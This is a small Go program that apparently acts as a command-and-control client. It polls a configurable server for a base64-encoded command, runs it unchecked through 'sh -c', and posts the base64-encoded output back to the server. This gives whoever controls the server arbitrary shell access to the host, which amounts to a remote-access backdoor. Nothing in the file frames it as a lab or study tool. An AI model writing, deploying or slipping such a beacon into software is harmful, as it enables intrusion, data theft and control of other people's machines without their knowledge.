package main

import (
	"encoding/base64"
	"flag"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"io"
)

func main() {
	server := flag.String("host", "http://localhost:8080", "The location of the command server.")
	debug := flag.Bool("verbose", true, "enable nominal printouts")
	flag.Parse()

	if *debug {
		log.Println("Running command client against server: ", *server)
	}

	resp, err := http.Get(*server + "/command")
	if err != nil {
		log.Fatal("Failed to get command: ", err)
	}

	if resp.StatusCode != 200 {
		log.Fatal("Failed to get command: HTTP status code ", resp.StatusCode, " != 200")
	}

	contentType, ok := resp.Header["Content-Type"]
	if ok == false || contentType[0] != "application/x-64" {
		log.Fatal("Unknown content type")
	}

	payload := make([]byte, 1024 * 100)
	n := 0
	if n, err = resp.Body.Read(payload); err != nil && err != io.EOF {
		log.Fatal("Failed to get data, read ", n, " bytes: ", err)
	}

	command, err := base64.StdEncoding.DecodeString(string(payload[0:n]))
	if err != nil {
		log.Fatal("Failed to decode data: ", err)
	}

	if *debug {
		log.Println("Command: " + string(command))
	}
	cmd := exec.Command("sh", "-c", string(command))

	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal("Failed to run command: ", err)
	}

	encodedOut := base64.StdEncoding.EncodeToString(out)

	if *debug {
		log.Println("Result: ", string(out))
		log.Println("Result (b64): ", encodedOut)
	}

	resp, err = http.Post(*server+"/response", "application/x-b64", strings.NewReader(encodedOut))
	if err != nil {
		log.Fatal("Failed to post response: ", err)
	}

	if resp.StatusCode != 200 {
		log.Fatal("Failed to post response: HTTP status code ", resp.StatusCode, " != 200")
	}

	if *debug {
		log.Println("Posted result")
	}
}
